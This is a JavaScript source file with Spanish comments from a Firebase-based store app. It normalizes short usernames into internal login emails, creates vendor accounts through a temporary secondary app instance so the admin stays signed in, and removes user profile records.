// Si en algún momento se quiere el borrado completo (Auth + perfil),
// se puede armar un script en scripts/ con el mismo patrón:
// admin.auth().deleteUser(uid) + admin.database().ref('users/'+uid).remove().
function deleteUserProfile(uid) {
  return refUsers.child(uid).remove().then(() => refCuentas.child(uid).remove().catch(() => {}));
}

// Crea una cuenta de vendedor SIN cerrar la sesión del admin que la
// está creando. Truco necesario: el SDK de Firebase Auth, al crear un
// usuario nuevo desde el cliente, automáticamente inicia sesión como
// ESE usuario nuevo — reemplazaría la sesión del admin en la misma
// pestaña. Para evitarlo, se abre una segunda instancia temporal de
// la app de Firebase (con otro nombre), se crea la cuenta ahí adentro
// (afectando solo a esa instancia aislada), y se descarta esa
// instancia al terminar — la sesión del admin en la app principal
// nunca se toca.
// El dominio técnico que convierte un "usuario" corto (ej. "ana")
// en algo con forma de correo, que es lo único que Firebase Auth
// acepta para iniciar sesión con contraseña. El vendedor nunca ve
// ni escribe esto — solo su usuario y su contraseña.
const USERNAME_AUTH_DOMAIN = 'adonay.local';

// Normaliza "Ana Torres", "ana.torres", "AnaTorres " → "anatorres":
// minúsculas, sin espacios ni acentos ni símbolos. Así "Usuario"
// funciona como si fuera un nombre de usuario normal, y dos
// variantes de escritura del mismo nombre ("Ana" vs "ana ") no
// generan cuentas técnicamente distintas por accidente.
function normalizeUsername(usuario) {
  return String(usuario || '')
    .normalize('NFD').replace(/[\u0300-\u036f]/g, '') // quita acentos
    .toLowerCase()
    .replace(/[^a-z0-9._-]/g, '');
}

function usernameToAuthEmail(usuario) {
  return normalizeUsername(usuario) + '@' + USERNAME_AUTH_DOMAIN;
}

// Crea una cuenta de vendedor identificada por un "usuario" corto
// (no un correo real) SIN cerrar la sesión del admin que la está
// creando — mismo truco de instancia secundaria que ya se explica
// más abajo. La unicidad del usuario la garantiza el propio
// Firebase Auth: dos personas no pueden registrar el mismo
// "usuario@adonay.local" — la segunda recibe el error
// auth/email-already-in-use tal como si hubiera escrito un correo
// repetido.
async function createVendorAccount(usuario, password, nombre, correo) {
  if (!currentTiendaId) {
    throw new Error('Solo una cuenta de tienda puede crear vendedores (no hay tienda activa).');
  }
  const usuarioNormalizado = normalizeUsername(usuario);
  if (!usuarioNormalizado) {
    throw new Error('El usuario debe tener al menos una letra o número.');
  }
  const authEmail = usernameToAuthEmail(usuarioNormalizado);

  const secondaryApp = firebase.initializeApp(firebaseConfig, 'Secondary-' + Date.now());
  try {
    const cred = await secondaryApp.auth().createUserWithEmailAndPassword(authEmail, password);
    const uid = cred.user.uid;
    await refUsers.child(uid).set({
      nombre: nombre || usuarioNormalizado,
      usuario: usuarioNormalizado,
      correo: correo || '',   // solo informativo (contacto / recuperar clave) — no se usa para iniciar sesión
      rol: 'vendedor',
      activo: true,
      creadoEn: Date.now(),
    });
    // Sin esto, el vendedor no podría iniciar sesión: es lo que le
    // dice al login a qué tienda pertenece (ver auth-guard.js).
    await refCuentas.child(uid).set({ rol: 'vendedor', tiendaId: currentTiendaId });
    await secondaryApp.auth().signOut();
    return uid;
  } finally {
    // Pase lo que pase (éxito o error), no dejar la instancia secundaria colgada.
    await secondaryApp.delete().catch(() => {});
  }
}
